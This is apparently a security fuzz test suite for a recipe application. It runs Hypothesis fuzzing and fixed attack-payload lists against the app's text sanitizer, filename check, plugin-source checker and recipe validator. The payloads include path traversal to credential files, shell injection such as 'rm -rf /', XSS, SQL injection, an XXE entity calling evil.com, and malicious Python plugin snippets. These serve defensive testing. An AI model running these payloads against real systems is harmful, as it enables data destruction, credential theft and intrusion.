"""KITCHEN SINK FUZZING - Throw everything at it.

This is an exhaustive security fuzzer designed to find:
- Memory corruption patterns (simulated in Python)
- Integer overflows
- Buffer overflows
- Null pointer dereferences
- Use-after-free patterns
- Double-free patterns
- Stack exhaustion
- Heap exhaustion
- Format string vulnerabilities
- Type confusion
- Race conditions
- Denial of service
- Every encoding bypass imaginable
- Every injection attack known

Run with: pytest tests/test_kitchen_sink_fuzz.py -v --tb=short -x 2>&1 | tee fuzz_results.log
"""

import gc
import json
import random
import struct
import sys
import threading
import time
import traceback
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import contextlib

from hypothesis import HealthCheck, Phase, given, settings
from hypothesis import strategies as st

from dinner_app.plugin_security import (
    check_plugin_source,
)
from dinner_app.security import (
    MAX_CATEGORIES_PER_RECIPE,
    MAX_DIRECTION_LENGTH,
    MAX_INGREDIENTS_PER_RECIPE,
    ValidationError,
    is_safe_filename,
    sanitize_text,
    validate_ingredients_list,
    validate_recipe_data,
    validate_recipe_name,
)

# Logging for vulnerabilities found
VULN_LOG = Path(__file__).parent / "vulnerabilities_found.log"


def log_vulnerability(
    category: str, description: str, payload: Any, error: Optional[Exception] = None
):
    """Log a discovered vulnerability."""
    timestamp = datetime.now().isoformat()
    with open(VULN_LOG, "a") as f:
        f.write(f"\n{'=' * 80}\n")
        f.write(f"VULNERABILITY FOUND: {timestamp}\n")
        f.write(f"Category: {category}\n")
        f.write(f"Description: {description}\n")
        f.write(f"Payload: {repr(payload)[:500]}\n")
        if error:
            f.write(f"Error: {type(error).__name__}: {str(error)[:200]}\n")
            f.write(f"Traceback:\n{traceback.format_exc()}\n")
        f.write(f"{'=' * 80}\n")


# Maximum fuzzing settings - 4 hour run
KITCHEN_SINK_SETTINGS = settings(
    max_examples=100000,  # 100k examples per test
    deadline=None,
    suppress_health_check=[
        HealthCheck.too_slow,
        HealthCheck.filter_too_much,
        HealthCheck.data_too_large,
        HealthCheck.large_base_example,
    ],
    phases=[Phase.generate, Phase.target, Phase.shrink],
    database=None,  # Don't cache - we want fresh fuzzing
)

HEAVY_SETTINGS = settings(
    max_examples=50000,
    deadline=None,
    suppress_health_check=[
        HealthCheck.too_slow,
        HealthCheck.filter_too_much,
        HealthCheck.data_too_large,
    ],
)

MEDIUM_SETTINGS = settings(
    max_examples=20000,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.filter_too_much],
)


# =============================================================================
# PAYLOAD GENERATORS - The Kitchen Sink
# =============================================================================


class PayloadGenerators:
    """Generate malicious payloads of every type."""

    # Integer overflow payloads
    INT_OVERFLOW = [
        2**31 - 1,
        2**31,
        2**31 + 1,  # 32-bit boundary
        2**32 - 1,
        2**32,
        2**32 + 1,  # unsigned 32-bit
        2**63 - 1,
        2**63,
        2**63 + 1,  # 64-bit boundary
        2**64 - 1,
        2**64,
        2**64 + 1,  # unsigned 64-bit
        -(2**31),
        -(2**31) - 1,  # negative boundaries
        -(2**63),
        -(2**63) - 1,
        0,
        -1,
        1,
        0x7FFFFFFF,
        0x80000000,
        0xFFFFFFFF,
        0x7FFFFFFFFFFFFFFF,
        0x8000000000000000,
    ]

    # Float edge cases
    FLOAT_EDGE = [
        float("inf"),
        float("-inf"),
        float("nan"),
        0.0,
        -0.0,
        1e308,
        -1e308,
        1e-308,
        -1e-308,
        2.2250738585072014e-308,  # smallest normalized
        4.9406564584124654e-324,  # smallest subnormal
        1.7976931348623157e308,  # largest
        float.fromhex("0x1.fffffffffffffp+1023"),  # max
        float.fromhex("0x0.0000000000001p-1022"),  # min subnormal
    ]

    # Null byte variants
    NULL_BYTES = [
        "\x00",
        "\x00\x00",
        "\x00" * 100,
        "a\x00b",
        "\x00abc",
        "abc\x00",
        "test\x00evil",
        "safe\x00<script>",
        "%00",
        "%00%00",
        "test%00evil",
        "\0",
        "\\0",
        "\\x00",
        "\\u0000",
        b"\x00".decode("latin-1"),
    ]

    # Path traversal variants (exhaustive)
    PATH_TRAVERSAL = [
        # Unix
        "../",
        "../../",
        "../../../",
        "../" * 20,
        "..",
        "...",
        "....",
        "....." + "/" * 10,
        "./",
        ".//",
        "/..",
        "//../",
        "....//",
        "..../",
        "....\\",
        # Windows
        "..\\",
        "..\\..\\",
        "..\\..\\..\\",
        "..\\..\\..\\..\\..\\..\\..\\..\\",
        # Encoded
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "%2e%2e%5c",
        "..%5c",
        "%2e%2e\\",
        "%252e%252e%252f",
        "..%252f",  # double encoded
        "%c0%ae%c0%ae%c0%af",  # overlong UTF-8
        "%c0%ae%c0%ae/",
        "..%c0%af",
        "..%c1%9c",
        # Mixed
        "..././",
        "...\\.\\",
        "..\\/..\\",
        "....//....//",
        # Absolute paths
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/dev/null",
        "/dev/zero",
        "/dev/random",
        "C:\\Windows\\System32\\config\\SAM",
        "\\\\?\\C:\\Windows",
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
    ]

    # Command injection
    COMMAND_INJECTION = [
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`id`",
        "$(id)",
        "$(`id`)",
        "; rm -rf /",
        "| rm -rf /",
        "\n ls",
        "\r\n ls",
        "'; ls #",
        '"; ls #',
        "|| ls",
        "||| ls",
        ";|&`$()'\"\n\r",
        "${IFS}ls",
        "$IFS'l''s'",
        "l]s",
        "l[s",
        "l{s}",
    ]

    # XSS payloads (exhaustive)
    XSS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<div onmouseover=alert(1)>hover</div>",
        "<form action=javascript:alert(1)><input type=submit>",
        "javascript:alert(1)",
        "vbscript:msgbox(1)",
        "data:text/html,<script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<script>script>alert(1)<</script>/script>",
        "<script\x00>alert(1)</script>",
        "<script\x09>alert(1)</script>",
        "<script\x0a>alert(1)</script>",
        "<script\x0d>alert(1)</script>",
        "<script/src=data:,alert(1)>",
        "'\"--><script>alert(1)</script>",
        "'-alert(1)-'",
        '"-alert(1)-"',
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "\u003cscript\u003ealert(1)\u003c/script\u003e",
        '<img src="x" onerror="alert(1)">',
        '<img/src="x"/onerror="alert(1)">',
        "<img\nsrc=x\nonerror=alert(1)>",
        "<img\tsrc=x\tonerror=alert(1)>",
    ]

    # SQL injection
    SQL_INJECTION = [
        "' OR '1'='1",
        '" OR "1"="1',
        "'; DROP TABLE users; --",
        "'; DELETE FROM recipes; --",
        "1; SELECT * FROM users",
        "1 UNION SELECT * FROM users",
        "' UNION SELECT NULL--",
        "admin'--",
        "admin'#",
        "1' AND '1'='1",
        '1" AND "1"="1',
        "'; EXEC xp_cmdshell('whoami'); --",
        "'; WAITFOR DELAY '0:0:10'--",
        "1; SHUTDOWN--",
        "' OR 1=1--",
        '" OR 1=1--',
        "' OR ''='",
        '" OR ""="',
        "'; INSERT INTO users VALUES('hacked')--",
        "1' ORDER BY 1--",
        "1' GROUP BY 1--",
        "1' HAVING 1=1--",
    ]

    # LDAP injection
    LDAP_INJECTION = [
        "*",
        "*)(&",
        "*)(|",
        "*()|&'",
        "admin)(&)",
        "admin)(|(password=*))",
        "*)(uid=*))(|(uid=*",
        "\\00",
        "\\2a",
        "\\28",
        "\\29",
    ]

    # XML/XXE injection
    XXE = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]>',
        "<![CDATA[<script>alert(1)</script>]]>",
        '<?xml version="1.0" encoding="ISO-8859-1"?>',
    ]

    # Template injection
    TEMPLATE_INJECTION = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{constructor.constructor('return this')()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{7*7}",
        "@(7*7)",
        "[[7*7]]",
        "{{config}}",
        "{{self}}",
        "{{request}}",
        "${env}",
        "${sys}",
        "${runtime}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ]

    # Format string
    FORMAT_STRING = [
        "%s",
        "%n",
        "%x",
        "%p",
        "%s%s%s%s%s%s%s%s%s%s",
        "%n%n%n%n%n%n%n%n%n%n",
        "%x%x%x%x%x%x%x%x%x%x",
        "%.999999999s",
        "%99999999s",
        "{0}",
        "{0}{1}{2}{3}{4}",
        "%(name)s",
        "%(password)s",
        "${PATH}",
        "$HOME",
        "$USER",
        "AAAA%08x.%08x.%08x.%08x",
    ]

    # Unicode attacks
    UNICODE = [
        # RTL/LTR override
        "\u202e",
        "\u202d",
        "\u202c",
        "\u2066",
        "\u2067",
        "\u2068",
        "\u2069",
        "\u200e",
        "\u200f",
        # Zero-width
        "\u200b",
        "\u200c",
        "\u200d",
        "\ufeff",
        "\u00ad",
        # Homoglyphs
        "аdmin",  # Cyrillic 'а'
        "ѕcript",  # Cyrillic 'ѕ'
        "pаsswоrd",  # Mixed Cyrillic
        # Fullwidth
        "ｓｃｒｉｐｔ",
        "ａｄｍｉｎ",
        # Mathematical
        "𝓼𝓬𝓻𝓲𝓹𝓽",
        "𝕤𝕔𝕣𝕚𝕡𝕥",
        # Special
        "ﬁle",
        "ﬂag",  # ligatures
        # Combining chars
        "e\u0301",
        "a\u0300",
        "o\u0302",
        # Overlong UTF-8 (in raw form)
        "\xc0\xaf",
        "\xc1\x9c",
    ]

    # Regex DoS (ReDoS)
    REDOS = [
        "a" * 30 + "!",
        "a" * 50 + "b",
        " " * 1000,
        "=" * 100 + "x",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab",
        "((((((((((((((((((((x)))))))))))))))))))))*y",
        "x" + ".*" * 20 + "y",
    ]

    # Prototype pollution (for JS-like contexts)
    PROTOTYPE_POLLUTION = [
        "__proto__",
        "constructor",
        "prototype",
        "__proto__[admin]",
        "constructor.prototype",
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
    ]

    # Buffer overflow attempts
    BUFFER_OVERFLOW = [
        "A" * 256,
        "A" * 1024,
        "A" * 4096,
        "A" * 65536,
        "A" * (1024 * 1024),
        "\x41" * 1000 + "\x42\x42\x42\x42",  # NOP sled + EIP
        "A" * 100 + struct.pack("<I", 0x41414141).decode("latin-1"),
        "A" * 100 + struct.pack("<Q", 0x4141414141414141).decode("latin-1"),
    ]

    # Heap spray patterns
    HEAP_SPRAY = [
        "\x0c" * 1024,  # Common spray byte
        "\x0a\x0a\x0a\x0a" * 256,
        "\x90" * 1000,  # NOP sled
        "AAAA" * 1000,
    ]

    # Stack smashing
    STACK_SMASH = [
        "A" * 256 + "BBBB",  # Overflow + return address
        "A" * 512 + "\xef\xbe\xad\xde",  # Deadbeef
        "%n" * 100,  # Format string
    ]

    # Denial of service
    DOS = [
        "A" * (10 * 1024 * 1024),  # 10MB
        "(" * 10000 + ")" * 10000,  # Deeply nested
        "{" * 10000 + "}" * 10000,
        "[" * 10000 + "]" * 10000,
        "a]" * 10000,  # Regex backtracking
        "\\x" * 10000,
    ]

    @classmethod
    def all_payloads(cls):
        """Generate all payloads."""
        for attr in dir(cls):
            if attr.isupper() and not attr.startswith("_"):
                value = getattr(cls, attr)
                if isinstance(value, list):
                    for payload in value:
                        yield attr, payload


# =============================================================================
# TEXT SANITIZATION - KITCHEN SINK
# =============================================================================


class TestKitchenSinkTextSanitization:
    """Throw everything at text sanitization."""

    def test_all_payloads(self):
        """Test every payload in our arsenal."""
        failures = []
        for category, payload in PayloadGenerators.all_payloads():
            try:
                if isinstance(payload, (bytes, int, float)):
                    if isinstance(payload, bytes):
                        payload = payload.decode("latin-1", errors="replace")
                    elif isinstance(payload, (int, float)):
                        payload = str(payload)
                result = sanitize_text(str(payload), max_length=10000)
                # Check for dangerous patterns that should be blocked
                lower_result = result.lower()
                if any(
                    x in lower_result for x in ["<script", "javascript:", "onerror=", "onload="]
                ):
                    failures.append((category, payload, "XSS pattern passed through"))
            except ValidationError:
                pass  # Expected for malicious input
            except Exception as e:
                log_vulnerability(
                    "TEXT_SANITIZATION", f"Unexpected error with {category} payload", payload, e
                )
                failures.append((category, payload, str(e)))

        if failures:
            for cat, pay, err in failures[:10]:
                print(f"FAIL: {cat}: {repr(pay)[:50]} -> {err}")
        assert len(failures) == 0, f"{len(failures)} payloads caused issues"

    @given(st.binary(max_size=100000))
    @HEAVY_SETTINGS
    def test_binary_as_text_massive(self, data):
        """Fuzz with massive binary data decoded as text."""
        try:
            for encoding in ["utf-8", "latin-1", "utf-16", "utf-32", "cp1252", "iso-8859-1"]:
                try:
                    text = data.decode(encoding, errors="replace")
                    result = sanitize_text(text, max_length=50000)
                    assert isinstance(result, str)
                except (UnicodeDecodeError, ValidationError):
                    pass
        except Exception as e:
            log_vulnerability("BINARY_DECODE", "Crash on binary decode", data[:100], e)
            raise

    @given(st.text(max_size=500000))
    @KITCHEN_SINK_SETTINGS
    def test_massive_text_input(self, text):
        """Fuzz with massive text inputs."""
        try:
            result = sanitize_text(text, max_length=100000)
            assert isinstance(result, str)
            assert len(result) <= 100000
        except ValidationError:
            pass
        except MemoryError:
            pass  # Expected for huge inputs
        except Exception as e:
            log_vulnerability("MASSIVE_TEXT", "Crash on massive text", len(text), e)
            raise

    @given(st.lists(st.text(max_size=1000), min_size=100, max_size=1000))
    @HEAVY_SETTINGS
    def test_concatenated_payloads(self, texts):
        """Fuzz with many concatenated strings."""
        combined = "".join(texts)
        try:
            result = sanitize_text(combined, max_length=100000)
            assert isinstance(result, str)
        except ValidationError:
            pass
        except Exception as e:
            log_vulnerability("CONCAT_STRINGS", "Crash on concatenated strings", len(combined), e)
            raise

    def test_all_unicode_categories(self):
        """Test all Unicode categories."""
        import unicodedata

        failures = []

        # Generate one character from each Unicode category
        for codepoint in range(0x10FFFF):
            try:
                char = chr(codepoint)
                unicodedata.category(char)
                result = sanitize_text(char * 100, max_length=1000)
                assert isinstance(result, str)
            except (ValidationError, ValueError):
                pass
            except Exception as e:
                failures.append((codepoint, str(e)))
                if len(failures) > 100:
                    break

        for cp, _err in failures[:10]:
            log_vulnerability(
                "UNICODE_CATEGORY",
                f"Crash on codepoint {cp}",
                chr(cp) if cp < 0x10000 else f"U+{cp:X}",
                None,
            )

    @given(st.integers(min_value=0, max_value=0x10FFFF))
    @HEAVY_SETTINGS
    def test_single_codepoints(self, codepoint):
        """Fuzz with individual Unicode codepoints."""
        try:
            char = chr(codepoint)
            result = sanitize_text(char * 100, max_length=1000)
            assert isinstance(result, str)
        except (ValidationError, ValueError):
            pass
        except Exception as e:
            log_vulnerability("CODEPOINT", f"Crash on codepoint {codepoint}", codepoint, e)
            raise


# =============================================================================
# FILENAME VALIDATION - KITCHEN SINK
# =============================================================================


class TestKitchenSinkFilename:
    """Throw everything at filename validation."""

    def test_all_path_payloads(self):
        """Test all path traversal payloads."""
        failures = []
        for payload in PayloadGenerators.PATH_TRAVERSAL:
            result = is_safe_filename(payload)
            if result is True:
                failures.append(payload)

        assert len(failures) == 0, f"These path payloads were not rejected: {failures}"

    def test_all_null_payloads(self):
        """Test all null byte payloads."""
        failures = []
        for payload in PayloadGenerators.NULL_BYTES:
            if isinstance(payload, bytes):
                payload = payload.decode("latin-1")
            result = is_safe_filename(payload + ".py")
            if result is True:
                failures.append(payload)

        assert len(failures) == 0, f"These null payloads were not rejected: {failures}"

    def test_all_command_injection(self):
        """Test all command injection payloads."""
        failures = []
        for payload in PayloadGenerators.COMMAND_INJECTION:
            result = is_safe_filename(payload)
            if result is True:
                failures.append(payload)

        assert len(failures) == 0, f"These command injection payloads were not rejected: {failures}"

    @given(st.text(max_size=100000))
    @KITCHEN_SINK_SETTINGS
    def test_massive_filename_fuzzing(self, filename):
        """Fuzz filenames with massive inputs."""
        try:
            result = is_safe_filename(filename)
            assert isinstance(result, bool)
        except Exception as e:
            log_vulnerability("FILENAME", "Crash on filename", filename[:100], e)
            raise

    @given(st.binary(max_size=10000))
    @HEAVY_SETTINGS
    def test_binary_filenames(self, data):
        """Fuzz with binary data as filenames."""
        try:
            for encoding in ["utf-8", "latin-1", "utf-16"]:
                try:
                    filename = data.decode(encoding, errors="replace")
                    result = is_safe_filename(filename)
                    assert isinstance(result, bool)
                except UnicodeDecodeError:
                    pass
        except Exception as e:
            log_vulnerability("BINARY_FILENAME", "Crash on binary filename", data[:50], e)
            raise


# =============================================================================
# PLUGIN SECURITY - KITCHEN SINK
# =============================================================================


class TestKitchenSinkPluginSecurity:
    """Throw everything at plugin security."""

    MALICIOUS_PYTHON_CODE = [
        # Direct dangerous imports
        "import os; os.system('rm -rf /')",
        "import subprocess; subprocess.call(['whoami'])",
        "from os import system; system('id')",
        "from subprocess import Popen; Popen(['cat', '/etc/passwd'])",
        # Obfuscated imports
        "__import__('os').system('id')",
        "getattr(__import__('os'), 'system')('id')",
        'eval(\'__import__("os").system("id")\')',
        "exec('import os; os.system(\"id\")')",
        "compile('import os', '', 'exec')",
        # Builtins manipulation
        "__builtins__['eval']('1+1')",
        "__builtins__.__dict__['exec']('import os')",
        "globals()['__builtins__']['eval']('1')",
        # Class manipulation
        "().__class__.__bases__[0].__subclasses__()",
        "''.__class__.__mro__[1].__subclasses__()",
        "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Popen']",
        # Lambda tricks
        "(lambda: __import__('os').system('id'))()",
        "(lambda x=__import__('os'): x.system('id'))()",
        # Comprehension tricks
        "[__import__('os').system('id') for _ in [1]]",
        "{__import__('os'): 1}",
        # Exception tricks
        "try:\n    raise Exception(__import__('os'))\nexcept Exception as e:\n    e.args[0].system('id')",
        # Decorator tricks
        "@(lambda f: __import__('os').system('id'))\ndef foo(): pass",
        # Type tricks
        "type('X', (), {'__init__': lambda s: __import__('os')})().system('id')",
        # Nested eval
        "eval(eval('chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)'))",
        # Pickle exploitation
        "import pickle; pickle.loads(b'exploit')",
        # File operations
        "open('/etc/passwd').read()",
        "with open('/etc/shadow') as f: print(f.read())",
        # Network operations
        "__import__('socket').socket()",
        "__import__('urllib.request').request.urlopen('http://evil.com')",
        # ctypes
        "import ctypes; ctypes.CDLL(None)",
    ]

    def test_all_malicious_code(self):
        """Test all malicious Python code patterns."""
        for code in self.MALICIOUS_PYTHON_CODE:
            result = check_plugin_source(code)
            # Should either be marked unsafe or have warnings/errors
            has_issues = not result.is_safe or result.warnings or result.errors
            if not has_issues:
                log_vulnerability("PLUGIN_BYPASS", "Malicious code not detected", code, None)

    @given(st.text(max_size=500000))
    @KITCHEN_SINK_SETTINGS
    def test_massive_plugin_source(self, source):
        """Fuzz with massive plugin source."""
        try:
            result = check_plugin_source(source)
            assert hasattr(result, "is_safe")
        except Exception as e:
            log_vulnerability("PLUGIN_CRASH", "Crash on plugin source", len(source), e)
            raise

    @given(st.binary(max_size=100000))
    @HEAVY_SETTINGS
    def test_binary_plugin_source(self, data):
        """Fuzz with binary data as plugin source."""
        try:
            for encoding in ["utf-8", "latin-1", "utf-16"]:
                try:
                    source = data.decode(encoding, errors="replace")
                    result = check_plugin_source(source)
                    assert hasattr(result, "is_safe")
                except UnicodeDecodeError:
                    pass
        except Exception as e:
            log_vulnerability("PLUGIN_BINARY", "Crash on binary plugin", data[:50], e)
            raise


# =============================================================================
# RECIPE DATA - KITCHEN SINK
# =============================================================================


class TestKitchenSinkRecipeData:
    """Throw everything at recipe data validation."""

    @given(
        st.recursive(
            st.none()
            | st.booleans()
            | st.floats(allow_nan=True, allow_infinity=True)
            | st.integers()
            | st.text(max_size=1000)
            | st.binary(max_size=100),
            lambda children: st.lists(children, max_size=100)
            | st.dictionaries(st.text(max_size=100), children, max_size=50),
            max_leaves=10000,
        )
    )
    @KITCHEN_SINK_SETTINGS
    def test_arbitrary_data_structures(self, data):
        """Fuzz with arbitrary deeply nested data structures."""
        try:
            if isinstance(data, dict):
                result = validate_recipe_data(data)
                assert isinstance(result, dict)
        except (ValidationError, RecursionError, TypeError, ValueError):
            pass
        except Exception as e:
            log_vulnerability("RECIPE_DATA", "Crash on recipe data", type(data).__name__, e)
            raise

    def test_integer_overflow_in_cook_time(self):
        """Test integer overflow in cook_time."""
        for num in PayloadGenerators.INT_OVERFLOW:
            try:
                data = {"ingredients": [], "directions": "", "categories": [], "cook_time": num}
                result = validate_recipe_data(data)
                if "cook_time" in result:
                    assert 0 <= result["cook_time"] <= 1440
            except (ValidationError, OverflowError, ValueError):
                pass
            except Exception as e:
                log_vulnerability("INT_OVERFLOW", f"Crash on cook_time {num}", num, e)
                raise

    def test_float_edge_cases_in_cook_time(self):
        """Test float edge cases in cook_time."""
        for num in PayloadGenerators.FLOAT_EDGE:
            try:
                data = {"ingredients": [], "directions": "", "categories": [], "cook_time": num}
                result = validate_recipe_data(data)
                if "cook_time" in result:
                    assert isinstance(result["cook_time"], int)
                    assert 0 <= result["cook_time"] <= 1440
            except (ValidationError, OverflowError, ValueError):
                pass
            except Exception as e:
                log_vulnerability("FLOAT_EDGE", f"Crash on cook_time {num}", num, e)
                raise

    def test_deeply_nested_structures(self):
        """Test very deep nesting."""
        for depth in [100, 500, 1000, 5000]:
            nested = {"ingredients": [], "directions": "", "categories": []}
            for _ in range(depth):
                nested = {"nested": nested, "ingredients": [], "directions": "", "categories": []}
            try:
                result = validate_recipe_data(nested)
                assert isinstance(result, dict)
            except (RecursionError, ValidationError):
                pass
            except Exception as e:
                log_vulnerability("DEEP_NEST", f"Crash on depth {depth}", depth, e)

    def test_wide_structures(self):
        """Test very wide structures."""
        for width in [100, 1000, 10000]:
            try:
                wide = {
                    "ingredients": ["ing"] * min(width, MAX_INGREDIENTS_PER_RECIPE + 1000),
                    "directions": "x" * min(width * 100, MAX_DIRECTION_LENGTH * 2),
                    "categories": ["cat"] * min(width, MAX_CATEGORIES_PER_RECIPE + 100),
                }
                result = validate_recipe_data(wide)
                assert len(result["ingredients"]) <= MAX_INGREDIENTS_PER_RECIPE
            except (ValidationError, MemoryError):
                pass
            except Exception as e:
                log_vulnerability("WIDE_STRUCT", f"Crash on width {width}", width, e)


# =============================================================================
# CONCURRENCY & RACE CONDITIONS - KITCHEN SINK
# =============================================================================


class TestKitchenSinkConcurrency:
    """Test for race conditions and concurrency issues."""

    def test_extreme_concurrency(self):
        """Test with extreme concurrent access."""
        errors = []
        results = []
        lock = threading.Lock()

        def stress_worker(worker_id):
            try:
                for i in range(10000):
                    # Randomize operations
                    op = random.randint(0, 4)
                    if op == 0:
                        sanitize_text(
                            f"worker{worker_id}_iter{i}_" + "A" * random.randint(10, 1000)
                        )
                    elif op == 1:
                        validate_recipe_name(f"Recipe {worker_id}_{i}")
                    elif op == 2:
                        is_safe_filename(f"plugin_{worker_id}_{i}.py")
                    elif op == 3:
                        check_plugin_source(f"x = {i}")
                    else:
                        validate_recipe_data(
                            {"ingredients": [f"ing{i}"], "directions": "", "categories": []}
                        )
                with lock:
                    results.append(worker_id)
            except Exception as e:
                with lock:
                    errors.append((worker_id, e))

        threads = [threading.Thread(target=stress_worker, args=(i,)) for i in range(50)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=300)

        if errors:
            for wid, err in errors[:5]:
                log_vulnerability("CONCURRENCY", f"Error in worker {wid}", None, err)

        assert len(errors) == 0, f"{len(errors)} concurrent errors"
        assert len(results) == 50, f"Only {len(results)} workers completed"

    def test_rapid_allocation_deallocation(self):
        """Test rapid memory allocation/deallocation."""
        errors = []

        def alloc_worker():
            try:
                for _ in range(1000):
                    # Allocate various sized objects
                    sizes = [100, 1000, 10000, 100000]
                    for size in sizes:
                        s = "A" * size
                        result = sanitize_text(s, max_length=size + 1)
                        del result
                        del s
                    gc.collect()
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=alloc_worker) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=120)

        assert len(errors) == 0, f"Memory errors: {errors}"

    def test_interleaved_operations(self):
        """Test interleaved operations for state corruption."""
        shared_state = {"counter": 0, "errors": []}
        lock = threading.Lock()

        def interleave_worker(worker_id):
            for i in range(5000):
                try:
                    # Interleave different operations
                    if i % 3 == 0:
                        sanitize_text(f"text_{worker_id}_{i}")
                        with lock:
                            shared_state["counter"] += 1
                    elif i % 3 == 1:
                        validate_recipe_data(
                            {
                                "ingredients": [f"ing_{worker_id}_{i}"],
                                "directions": f"step {i}",
                                "categories": [],
                            }
                        )
                    else:
                        check_plugin_source(f"x = {i}")
                except Exception as e:
                    with lock:
                        shared_state["errors"].append((worker_id, i, e))

        threads = [threading.Thread(target=interleave_worker, args=(i,)) for i in range(30)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=120)

        assert len(shared_state["errors"]) == 0, f"Interleaved errors: {shared_state['errors'][:5]}"


# =============================================================================
# MEMORY EXHAUSTION & DOS - KITCHEN SINK
# =============================================================================


class TestKitchenSinkMemoryDOS:
    """Test for memory exhaustion and denial of service."""

    def test_memory_bomb_strings(self):
        """Test memory bomb string patterns."""
        bombs = [
            "A" * (1024 * 1024),  # 1MB
            "A" * (10 * 1024 * 1024),  # 10MB
            "\x00" * (1024 * 1024),  # 1MB nulls
            "漢" * (1024 * 1024),  # 1MB Chinese chars (3 bytes each)
        ]
        for bomb in bombs:
            try:
                result = sanitize_text(bomb, max_length=1000)
                assert len(result) <= 1000
            except (ValidationError, MemoryError):
                pass
            except Exception as e:
                log_vulnerability("MEMORY_BOMB", f"Crash on {len(bomb)} byte bomb", len(bomb), e)

    def test_regex_dos_patterns(self):
        """Test ReDoS patterns."""
        for pattern in PayloadGenerators.REDOS:
            start = time.time()
            with contextlib.suppress(ValidationError):
                sanitize_text(pattern)
            elapsed = time.time() - start
            if elapsed > 5.0:
                log_vulnerability("REDOS", f"ReDoS: {elapsed}s for pattern", pattern[:50], None)
                raise AssertionError(f"ReDoS detected: {elapsed}s")

    def test_deeply_nested_regex_patterns(self):
        """Test deeply nested patterns that could cause backtracking."""
        patterns = [
            "(" * 100 + "x" + ")" * 100,
            "[" * 100 + "x" + "]" * 100,
            "{" * 100 + "x" + "}" * 100,
            "<" * 100 + "x" + ">" * 100,
        ]
        for pattern in patterns:
            start = time.time()
            with contextlib.suppress(ValidationError):
                sanitize_text(pattern)
            elapsed = time.time() - start
            assert elapsed < 5.0, f"Nested pattern took {elapsed}s"


# =============================================================================
# INTEGER & NUMERIC EDGE CASES - KITCHEN SINK
# =============================================================================


class TestKitchenSinkNumeric:
    """Test all numeric edge cases."""

    @given(st.integers())
    @KITCHEN_SINK_SETTINGS
    def test_arbitrary_integers(self, num):
        """Fuzz with arbitrary integers."""
        try:
            data = {"ingredients": [], "directions": "", "categories": [], "cook_time": num}
            result = validate_recipe_data(data)
            if "cook_time" in result:
                assert isinstance(result["cook_time"], int)
        except (ValidationError, OverflowError, ValueError):
            pass
        except Exception as e:
            log_vulnerability("INTEGER", f"Crash on integer {num}", num, e)
            raise

    @given(st.floats())
    @KITCHEN_SINK_SETTINGS
    def test_arbitrary_floats(self, num):
        """Fuzz with arbitrary floats."""
        try:
            data = {"ingredients": [], "directions": "", "categories": [], "cook_time": num}
            validate_recipe_data(data)
        except (ValidationError, OverflowError, ValueError):
            pass
        except Exception as e:
            log_vulnerability("FLOAT", "Crash on float", num, e)
            raise

    @given(st.complex_numbers())
    @HEAVY_SETTINGS
    def test_complex_numbers(self, num):
        """Try complex numbers (should be handled gracefully)."""
        try:
            data = {"ingredients": [], "directions": "", "categories": [], "cook_time": num}
            validate_recipe_data(data)
        except (ValidationError, TypeError, ValueError):
            pass
        except Exception as e:
            log_vulnerability("COMPLEX", "Crash on complex", num, e)
            raise

    def test_special_numeric_strings(self):
        """Test special numeric strings."""
        special = [
            "NaN",
            "Infinity",
            "-Infinity",
            "1e999",
            "-1e999",
            "1e-999",
            "0x7FFFFFFF",
            "0xFFFFFFFF",
            "9" * 1000,  # Very long number
            "-" + "9" * 1000,
            "1.1" + "1" * 1000,
        ]
        for s in special:
            try:
                result = sanitize_text(s)
                assert isinstance(result, str)
            except ValidationError:
                pass


# =============================================================================
# TYPE CONFUSION - KITCHEN SINK
# =============================================================================


class TestKitchenSinkTypeConfusion:
    """Test type confusion vulnerabilities."""

    def test_type_juggling(self):
        """Test type juggling attacks."""
        juggles = [
            (0, "0"),
            ("0", 0),
            (False, 0),
            (None, ""),
            ([], ""),
            ({}, ""),
            (set(), ""),
            (0.0, False),
            ("false", False),
            ("true", True),
            (b"test", "test"),
            (bytearray(b"test"), "test"),
            (memoryview(b"test"), "test"),
        ]
        for a, b in juggles:
            try:
                # Try passing to various functions
                if isinstance(a, str):
                    sanitize_text(a)
                if isinstance(a, dict):
                    validate_recipe_data(a)
                if isinstance(a, list):
                    validate_ingredients_list(a)
